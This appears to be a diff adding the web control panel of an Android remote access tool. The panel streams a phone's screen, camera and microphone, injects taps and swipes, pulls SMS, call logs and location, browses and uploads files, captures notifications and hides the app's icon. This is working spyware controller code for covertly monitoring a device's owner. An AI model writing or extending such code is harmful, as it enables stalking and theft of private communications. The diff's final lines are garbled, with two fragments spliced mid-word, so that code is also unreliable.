@@ -16,6 +16,9 @@
   .dot { width:10px; height:10px; border-radius:50%; background:var(--warn); display:inline-block; margin-right:6px; }
   .dot.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
   select { background:#000; color:var(--acc); border:1px solid var(--line); padding:6px; border-radius:6px; outline:none; font-size:12px; max-width:150px; }
+  
+  /* Error Banner */
+  #msg-box { display:none; background:var(--warn); color:#fff; padding:10px; text-align:center; font-weight:bold; font-size:13px; position:sticky; top:80px; z-index:9; }
 
   nav { display:flex; background:var(--panel); border-bottom:1px solid var(--line); overflow-x:auto; }
   nav button { flex:1; background:none; border:none; color:var(--dim); padding:12px 5px; font-size:12px; font-weight:bold; text-transform:uppercase; border-bottom:2px solid transparent; white-space:nowrap; }
@@ -34,11 +37,8 @@
   button.act.danger { color:var(--warn); border-color:#331111; }
   button.act.danger:active { background:#331111; }
 
-  /* Live Screen Container */
   .screen-container { position:relative; width:100%; background:#000; border:1px solid var(--line); border-radius:6px; margin-top:8px; overflow:hidden; touch-action:none; }
   canvas { width:100%; display:block; }
-  
-  /* Direct touch indicator */
   .touch-ripple { position:absolute; width:30px; height:30px; border:2px solid var(--acc); border-radius:50%; transform:translate(-50%, -50%); pointer-events:none; animation:ripple 0.4s ease-out; }
   @keyframes ripple { from { opacity:1; transform:translate(-50%,-50%) scale(1); } to { opacity:0; transform:translate(-50%,-50%) scale(2); } }
 
@@ -71,6 +71,8 @@
   </div>
 </header>
 
+<div id="msg-box"></div>
+
 <nav>
   <button class="active" onclick="switchTab('live', this)">Live</button>
   <button onclick="switchTab('device', this)">Device</button>
@@ -79,7 +81,6 @@
 </nav>
 
 <main>
-  <!-- LIVE TAB -->
   <div id="tab-live" class="tab active">
     <div class="card">
       <h2>Live Screen (Tap/Swipe here)</h2>
@@ -103,7 +104,6 @@
     </div>
   </div>
 
-  <!-- DEVICE TAB -->
   <div id="tab-device" class="tab">
     <div class="card">
       <h2>Device Info</h2>
@@ -122,7 +122,6 @@
     </div>
   </div>
 
-  <!-- FILES TAB -->
   <div id="tab-files" class="tab">
     <div class="card">
       <h2>File Manager</h2>
@@ -132,7 +131,6 @@
       </div>
       <div class="file-list" id="file-list"></div>
       <pre id="files-out" style="margin-top:10px;">Awaiting command...</pre>
-      
       <hr style="border-color:#222; margin:15px 0;">
       <h2>Upload File</h2>
       <input id="upload" type="file" style="color:var(--fg); margin-bottom:10px; display:block; width:100%;">
@@ -140,7 +138,6 @@
     </div>
   </div>
 
-  <!-- NOTIFS TAB -->
   <div id="tab-notifs" class="tab">
     <div class="card">
       <h2>Live Notifications</h2>
@@ -154,6 +151,13 @@ const $ = id => document.getElementById(id);
 let ws = null;
 let currentDevice = "";
 let realScreenW = 1080, realScreenH = 1920;
+
+function showMsg(msg) {
+  const box = $('msg-box');
+  box.textContent = msg;
+  box.style.display = 'block';
+  setTimeout(() => { box.style.display = 'none'; }, 5000);
+}
 
 function switchTab(tabId, btn) {
   document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
@@ -169,10 +173,10 @@ function onDeviceChange() {
 }
 
 async function api(cmd, args = {}) {
-  if (!currentDevice) throw new Error("No device selected");
+  if (!currentDevice) { showMsg("No device selected"); throw new Error("No device"); }
   const psk = $('psk').value.trim();
   const server = $('server').value.trim().replace(/\/+$/, '');
-  if (!psk || !server) throw new Error('Set server + PSK');
+  if (!psk || !server) { showMsg("Set server + PSK"); throw new Error("No creds"); }
   const r = await fetch(server + '/api/cmd', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + psk },
@@ -180,7 +184,8 @@ async function api(cmd, args = {}) {
   });
   if (!r.ok) {
     let body = ''; try { body = (await r.json()).error || ''; } catch (_) {}
-    throw new Error(`HTTP ${r.status}${body ? ' — ' + body : ''}`);
+    showMsg(`HTTP ${r.status} — ${body}`);
+    throw new Error(`HTTP ${r.status}`);
   }
   return await r.json();
 }
@@ -193,10 +198,16 @@ function setLed(on) {
 async function connect() {
   const psk = $('psk').value.trim();
   const server = $('server').value.trim().replace(/\/+$/, '');
-  if (!psk || !server) { alert('Enter server + PSK'); return; }
+  if (!psk || !server) { showMsg('Enter server + PSK'); return; }
   sessionStorage.setItem('psk', psk);
   sessionStorage.setItem('server', server);
-  $('status').textContent = 'Connecting...';
+  
+  $('status').textContent = 'Waking server...';
+  try {
+    await fetch(server + '/'); // Wake up Render free tier
+  } catch (e) {
+    showMsg('Server unreachable. Check URL.');
+  }
   openWs(server, psk);
 }
 
@@ -209,6 +220,221 @@ function openWs(server, psk) {
   ws.onopen = () => { setLed(true); ws.send(JSON.stringify({ role: 'dashboard', psk })); };
   ws.onmessage = ev => { try { handlePush(JSON.parse(ev.data)); } catch (_) {} };
   ws.onclose = () => {
+    setLed(false); $('status').textContent = 'Reconnecting...';
+    const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
+    if (p && s) setTimeout(() => openWs(s, p), 3000);
+  };
+  ws.onerror = () => { showMsg('WebSocket error. Check server.'); };
+}
+
+function handlePush(msg) {
+  if (msg.type === 'device_list') {
+    const sel = $('device-select');
+    sel.innerHTML = '<option value="">Select Device</option>';
+    msg.devices.forEach(addDeviceOption);
+  } else if (msg.type === 'device_online') {
+    addDeviceOption(msg.device_id);
+  } else if (msg.type === 'device_offline') {
+    const sel = $('device-select');
+    const opt = [...sel.options].find(o => o.value === msg.device_id);
+    if (opt) opt.remove();
+    if (currentDevice === msg.device_id) { currentDevice = ""; onDeviceChange(); }
+  } else if (msg.type === 'push') {
+    if (msg.kind === 'screen_frame') drawScreenFrame(msg.data);
+    else if (msg.kind === 'camera_frame') { $('cam-img').src = 'data:image/jpeg;base64,' + msg.data; $('cam-img').style.display = 'block'; }
+    else if (msg.kind === 'audio_chunk') playAudio(msg.data);
+    else if (msg.kind === 'notification') addNotif(msg.data);
+  }
+}
+
+function addDeviceOption(id) {
+  const sel = $('device-select');
+  if ([...sel.options].some(o => o.value === id)) return;
+  const opt = document.createElement('option');
+  opt.value = id; opt.textContent = id;
+  sel.appendChild(opt);
+  if (!currentDevice) { sel.value = id; onDeviceChange(); }
+}
+
+let frameCount = 0;
+function drawScreenFrame(b64) {
+  const cv = $('screen'), ctx = cv.getContext('2d');
+  const img = new Image();
+  img.onload = () => {
+    if (cv.width !== img.width || cv.height !== img.height) { cv.width = img.width; cv.height = img.height; }
+    ctx.drawImage(img, 0, 0);
+    frameCount++; $('frameCount').textContent = frameCount + ' frames';
+  };
+  img.src = 'data:image/jpeg;base64,' + b64;
+}
+
+// --- TOUCH INTERACTION LOGIC ---
+const cv = $('screen');
+let touchStartX = 0, touchStartY = 0, touchStartTime = 0;
+
+function getCanvasCoords(e) {
+  const rect = cv.getBoundingClientRect();
+  const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+  const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+  return {
+    x: (clientX - rect.left) * (cv.width / rect.width),
+    y: (clientY - rect.top) * (cv.height / rect.height)
+  };
+}
+
+function showRipple(clientX, clientY) {
+  const cont = $('screen-container');
+  const rect = cont.getBoundingClientRect();
+  const rip = document.createElement('div');
+  rip.className = 'touch-ripple';
+  rip.style.left = (clientX - rect.left) + 'px';
+  rip.style.top = (clientY - rect.top) + 'px';
+  cont.appendChild(rip);
+  setTimeout(() => rip.remove(), 400);
+}
+
+cv.addEventListener('touchstart', e => {
+  e.preventDefault();
+  const c = getCanvasCoords(e);
+  touchStartX = c.x; touchStartY = c.y;
+  touchStartTime = Date.now();
+  showRipple(e.touches[0].clientX, e.touches[0].clientY);
+}, { passive: false });
+
+cv.addEventListener('touchend', async e => {
+  e.preventDefault();
+  const c = getCanvasCoords(e.changedTouches[0]);
+  const dx = Math.abs(c.x - touchStartX);
+  const dy = Math.abs(c.y - touchStartY);
+  const duration = Date.now() - touchStartTime;
+
+  const realStartX = touchStartX * (realScreenW / cv.width);
+  const realStartY = touchStartY * (realScreenH / cv.height);
+  const realEndX = c.x * (realScreenW / cv.width);
+  const realEndY = c.y * (realScreenH / cv.height);
+
+  if (dx < 20 && dy < 20 && duration < 300) {
+    try { await api('tap', { x: realStartX, y: realStartY }); } catch (_) {}
+  } else {
+    try { await api('swipe', { x1: realStartX, y1: realStartY, x2: realEndX, y2: realEndY, duration: Math.max(duration, 200) }); } catch (_) {}
+  }
+}, { passive: false });
+
+cv.addEventListener('mousedown', e => {
+  const c = getCanvasCoords(e);
+  touchStartX = c.x; touchStartY = c.y; touchStartTime = Date.now();
+  showRipple(e.clientX, e.clientY);
+});
+cv.addEventListener('mouseup', async e => {
+  const c = getCanvasCoords(e);
+  const dx = Math.abs(c.x - touchStartX), dy = Math.abs(c.y - touchStartY);
+  const duration = Date.now() - touchStartTime;
+  const realStartX = touchStartX * (realScreenW / cv.width), realStartY = touchStartY * (realScreenH / cv.height);
+  const realEndX = c.x * (realScreenW / cv.width), realEndY = c.y * (realScreenH / cv.height);
+
+  if (dx < 20 && dy < 20 && duration < 300) {
+    try { await api('tap', { x: realStartX, y: realStartY }); } catch (_) {}
+  } else {
+    try { await api('swipe', { x1: realStartX, y1: realStartY, x2: realEndX, y2: realEndY, duration: Math.max(duration, 200) }); } catch (_) {}
+  }
+});
+// -------------------------------
+
+let actx = null, atime = 0;
+function playAudio(b64) {
+  if (!actx) { actx = new AudioContext({ sampleRate: 16000 }); atime = actx.currentTime; }
+  if (actx.state === 'suspended') actx.resume();
+  const bin = atob(b64);
+  const bytes = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+  const pcm = new Int16Array(bytes.buffer);
+  const buf = actx.createBuffer(1, pcm.length, 16000);
+  const ch = buf.getChannelData(0);
+  for (let i = 0; i < pcm.length; i++) ch[i] = pcm[i] / 32768;
+  const src = actx.createBufferSource(); src.buffer = buf; src.connect(actx.destination);
+  if (atime < actx.currentTime) atime = actx.currentTime;
+  src.start(atime); atime += buf.duration;
+}
+
+function addNotif(raw) {
+  const log = $('notif-log');
+  const div = document.createElement('div');
+  div.className = 'notif';
+  try {
+    const o = JSON.parse(raw);
+    div.innerHTML = `<b>${o.pkg}</b>${o.title ? '<strong>'+o.title+'</strong><br>' : ''}${o.text}`;
+  } catch (_) { div.textContent = raw; }
+  log.prepend(div);
+}
+
+function renderTelemetry(t) {
+  const el = $('telemetry-data'); el.innerHTML = '';
+  for (const [k, v] of Object.entries(t)) {
+    if(k === 'screen_w') realScreenW = v;
+    if(k === 'screen_h') realScreenH = v;
+    const row = document.createElement('div'); row.className = 'kv';
+    row.innerHTML = `<span>${k.replace(/_/g, ' ')}</span><b>${v}</b>`;
+    el.appendChild(row);
+  }
+}
+
+$('connect').onclick = connect;
+$('btn-refresh-telemetry').onclick = async () => {
+  try { const r = await api('get_device_info'); if (r.ok) renderTelemetry(r.data); } catch (e) {}
+};
+$('btn-sms').onclick = async () => { try { const r = await api('get_sms', { limit: 50 }); $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); } catch (e) {} };
+$('btn-calls').onclick = async () => { try { const r = await api('get_calllogs', { limit: 50 }); $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); } catch (e) {} };
+$('btn-location').onclick = async () => { try { const r = await api('get_location'); $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); } catch (e) {} };
+
+let screenOn = false, audioOn = false;
+$('btn-screen').onclick = async () => {
+  try {
+    if (!screenOn) {
+      const r = await api('start_screen'); if (r.ok) { screenOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.add('danger'); } else showMsg(r.error);
+    } else { await api('stop_screen'); screenOn = false; $('btn-screen').textContent = 'Start Screen'; $('btn-screen').classList.remove('danger'); }
+  } catch (e) {}
+};
+$('btn-audio').onclick = async () => {
+  try {
+    if (!audioOn) {
+      const r = await api('start_audio'); if (r.ok) { audioOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else showMsg(r.error);
+    } else { await api('stop_audio'); audioOn = false; $('btn-audio').textContent = 'Start Audio'; $('btn-audio').classList.remove('danger'); }
+  } catch (e) {}
+};
+$('btn-front-cam').onclick = async () => { try { await api('start_camera', { facing: 'front' }); } catch (e) {} };
+$('btn-back-cam').onclick = async () => { try { await api('start_camera', { facing: 'back' }); } catch (e) {} };
+$('btn-stop-cam').onclick = async () => { try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) {} };
+$('btn-hide').onclick = async () => { try { await api('hide_icon'); showMsg('Icon hidden.'); } catch (e) {} };
+
+$('btn-ls').onclick = async () => {
+  try { 
+    const r = await api('list_dir', { path: $('file-path').value });
+    const list = $('file-list'); list.innerHTML = '';
+    if (r.ok) {
+      r.data.entries.forEach(f => {
+        const div = document.createElement('div');
+        div.className = 'file-item ' + (f.dir ? 'folder' : '');
+        div.innerHTML = `<span>${f.dir ? '📁' : '📄'} ${f.name}</span><span>${f.dir ? '' : (f.size/1024).toFixed(1)+' KB'}</span>`;
+        div.onclick = () => { $('file-path').value = f.path; if (f.dir) { $('btn-ls').click(); } };
+        list.appendChild(div);
+      });
+    } else showMsg('Error: ' + r.error);
+  } catch (e) {}
+};
+
+$('btn-ul').onclick = async () => {
+  try {
+    const inp = $('upload'); if (!inp.files.length) return;
+    const f = inp.files[0];
+    const reader = new FileReader();
+    reader.onload = async () => {
+      const b64 = reader.result.split(',')[1];
+      $('files-out').textContent = `Uploading ${f.name} (${(f.size/1024).toFixed(1)} KB)...`;
+      try {
+        const r = await api('upload_file', { path: $('file-path').value + "/" + f.name, data: b64 });
+        $('files-out').textContent = r.ok ? ('Uploaded successfully') : ('Error: ' + r.error);
+        $('btn-ls').click();
+      } catch (e) { showMsg('Upload failclose = () => {
     setLed(false); $('status').textContent = 'Reconnecting...';
     const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
     if (p && s) setTimeout(() => openWs(s, p), 3000);
